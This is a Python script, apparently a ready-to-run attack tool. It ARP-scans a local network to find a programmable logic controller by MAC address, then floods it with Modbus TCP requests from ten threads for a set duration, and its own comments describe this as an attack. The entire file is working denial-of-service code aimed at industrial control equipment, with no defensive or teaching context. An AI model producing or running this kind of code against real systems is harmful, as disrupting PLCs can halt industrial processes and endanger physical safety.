import socket
import struct
import time
import threading
from scapy.all import ARP, Ether, srp

def find_plc_ip(target_mac, network="192.168.9.0/24"):
    """
    Discover the IP address of the PLC using ARP scanning.
    :param target_mac: The MAC address of the PLC.
    :param network: The network to scan.
    :return: The IP address of the PLC.
    """
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=2, verbose=0)[0]
    for sent, received in result:
        if received.hwsrc.lower() == target_mac.lower():
            return received.psrc
    return None

def send_modbus_tcp_flood(target_ip, target_port=502, duration=60):
    """
    Send a flood of Modbus TCP requests to the PLC.
    :param target_ip: The IP address of the PLC.
    :param target_port: The Modbus TCP port (default is 502).
    :param duration: The duration of the attack in seconds.
    """
    start_time = time.time()
    transaction_id = 0
    while time.time() - start_time < duration:
        try:
            transaction_id += 1
            modbus_payload = struct.pack(">HHHBBHH", transaction_id, 0, 6, 1, 3, 0, 1)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            sock.send(modbus_payload)
            sock.close()
            print(f"Sent Modbus TCP request to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error sending Modbus TCP request: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the flood rate

def main():
    # Replace with the actual MAC address of the PLC
    plc_mac = "00:1E:06:FF:FF:FF"
    plc_ip = find_plc_ip(plc_mac)
    if plc_ip:
        print(f"Found PLC at IP: {plc_ip}")
        # Number of threads to increase the flood rate
        num_threads = 10
        # Duration of the attack in seconds
        duration = 60
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=send_modbus_tcp_flood, args=(plc_ip, 502, duration))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
    else:
        print("PLC not found on the network.")

if __name__ == "__main__":
    main()